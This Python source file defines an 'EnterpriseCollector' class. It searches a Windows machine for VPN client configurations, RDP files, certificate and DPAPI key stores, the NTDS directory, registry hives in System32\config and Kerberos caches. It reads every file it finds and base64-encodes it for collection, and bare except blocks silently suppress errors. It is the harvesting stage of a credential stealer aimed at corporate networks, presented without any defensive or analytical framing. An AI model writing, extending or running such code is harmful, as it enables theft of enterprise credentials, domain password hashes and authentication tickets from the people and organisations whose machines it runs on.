import os
import json
import base64

class EnterpriseCollector:
    def __init__(self):
        self.data = {}
        
    def collect_vpn_configs(self):
        vpn_data = {}
        
        vpn_clients = {
            'cisco_anyconnect': os.path.join(os.environ.get('PROGRAMDATA', ''), 'Cisco', 'Cisco AnyConnect Secure Mobility Client'),
            'openvpn': os.path.join(os.environ.get('APPDATA', ''), 'OpenVPN'),
            'forticlient': os.path.join(os.environ.get('APPDATA', ''), 'Fortinet'),
            'pulse_secure': os.path.join(os.environ.get('APPDATA', ''), 'Pulse Secure'),
        }
        
        for client, path in vpn_clients.items():
            if os.path.exists(path):
                vpn_data[client] = self._collect_from_directory(path)
                
        return vpn_data
        
    def collect_rdp_credentials(self):
        rdp_data = {}
        
        rdp_paths = [
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents', 'Default.rdp'),
            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Terminal Server Client'),
        ]
        
        for path in rdp_paths:
            if os.path.exists(path):
                if os.path.isfile(path):
                    rdp_data[path] = self._read_file(path)
                else:
                    rdp_data[path] = self._collect_from_directory(path)
                    
        return rdp_data
        
    def collect_corporate_certificates(self):
        cert_data = {}
        
        cert_paths = [
            os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Roaming', 'Microsoft', 'SystemCertificates'),
            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Protect'),
        ]
        
        for path in cert_paths:
            if os.path.exists(path):
                cert_data[path] = self._collect_from_directory(path)
                
        return cert_data
        
    def collect_ad_tokens(self):
        ad_data = {}
        
        ad_paths = [
            os.path.join(os.environ.get('WINDIR', ''), 'NTDS'),
            os.path.join(os.environ.get('SYSTEMROOT', ''), 'System32', 'config'),
        ]
        
        for path in ad_paths:
            if os.path.exists(path):
                ad_data[path] = self._collect_from_directory(path)
                
        return ad_data
        
    def collect_kerberos_tickets(self):
        kerberos_data = {}
        
        kcc_cache = os.path.join(os.environ.get('WINDIR', ''), 'Temp', 'krbcc')
        
        if os.path.exists(kcc_cache):
            kerberos_data['krbcc_cache'] = self._read_file(kcc_cache)
            
        kerberos_paths = [
            os.path.join(os.environ.get('SYSTEMROOT', ''), 'Temp'),
            os.path.join(os.environ.get('USERPROFILE', ''), '.kcc'),
        ]
        
        for path in kerberos_paths:
            if os.path.exists(path):
                kerberos_data[path] = self._collect_from_directory(path)
                
        return kerberos_data
        
    def _collect_from_directory(self, path):
        data = {}
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        data[file] = self._read_file(file_path)
                    except:
                        pass
        except:
            pass
        return data
        
    def _read_file(self, path):
        try:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return b''
